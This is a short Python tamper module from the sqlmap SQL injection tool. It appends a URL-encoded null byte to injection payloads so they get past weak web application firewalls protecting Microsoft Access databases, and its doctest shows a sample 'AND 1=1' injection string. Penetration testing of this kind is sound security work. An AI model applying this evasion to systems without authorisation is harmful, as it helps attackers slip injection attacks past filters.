#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Appends (Access) NULL byte character (%00) at the end of payload

    Requirement:
        * Microsoft Access

    Notes:
        * Useful to bypass weak web application firewalls when the back-end
          database management system is Microsoft Access - further uses are
          also possible

    Reference: http://projects.webappsec.org/w/page/13246949/Null-Byte-Injection

    >>> tamper('1 AND 1=1')
    '1 AND 1=1%00'
    """

    return "%s%%00" % payload if payload else payload
